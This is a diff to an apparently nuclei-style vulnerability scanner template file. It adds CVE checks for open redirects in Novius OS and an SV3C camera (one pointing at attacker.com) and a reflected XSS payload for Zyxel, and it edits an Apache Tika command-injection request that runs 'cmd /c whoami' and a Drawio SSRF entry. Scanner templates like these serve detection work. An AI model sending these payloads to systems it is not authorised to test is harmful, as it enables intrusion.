@@ -3834,6 +3834,21 @@
       ]
     },
     {
+      "id": "CVE-2015-5354",
+      "info": {
+        "name": "Novius OS 5.0.1-elche - Open Redirect",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/novius-os/admin/nos/login?redirect=http://example.com"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2015-5461",
       "info": {
         "name": "StageShow <= 5.0.8 - Open Redirect",
@@ -6276,6 +6291,21 @@
       ]
     },
     {
+      "id": "CVE-2018-12675",
+      "info": {
+        "name": "SV3C HD Camera L-SERIES - Open Redirect",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/web/cgi-bin/hi3510/param.cgi?cmd=setmobilesnapattr&cururl=http%3A%2F%2Fattacker.com"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2018-1271",
       "info": {
         "name": "Spring MVC Directory Traversal Vulnerability",
@@ -6330,11 +6360,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
+            "Connection": "close",
+            "X-Tika-OCRTesseractPath": "cscript",
             "X-Tika-OCRLanguage": "//E:Jscript",
             "Expect": "100-continue",
-            "Content-type": "image/jp2",
-            "Connection": "close",
-            "X-Tika-OCRTesseractPath": "cscript"
+            "Content-type": "image/jp2"
           },
           "method": "PUT",
           "path": [
@@ -7997,6 +8027,21 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/log?type=%22%3C/script%3E%3Cscript%3Ealert(document.domain);%3C/script%3E%3Cscript%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2019-12581",
+      "info": {
+        "name": "Zyxel ZyWall / USG / UAG - Reflected Cross-site scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/free_time_failed.cgi?err_msg=<script>alert(document.domain);</script>"
           ]
         }
       ]
@@ -17531,7 +17576,7 @@
     {
       "id": "CVE-2022-1713",
       "info": {
-        "name": "SSRF on /proxy in GitHub repository jgraph/drawio",
+        "name": "Drawio - SSRF on /proxy endpoint",
         "severity": "high"
       },
       "requests": [
